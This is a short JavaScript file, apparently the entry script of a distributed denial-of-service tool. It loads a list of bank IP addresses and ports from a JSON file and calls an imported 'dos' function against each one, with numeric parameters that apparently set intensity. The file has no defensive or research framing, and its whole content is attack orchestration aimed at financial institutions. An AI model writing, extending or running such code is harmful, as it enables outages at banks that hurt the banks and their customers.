const { dos } = require("./controllers/ddos.js");
const banks = require("./targets/banks.json");
banks.map(({ ip_str, port }) => {
  dos(`${ip_str}:${port}`, 150, 500);
});
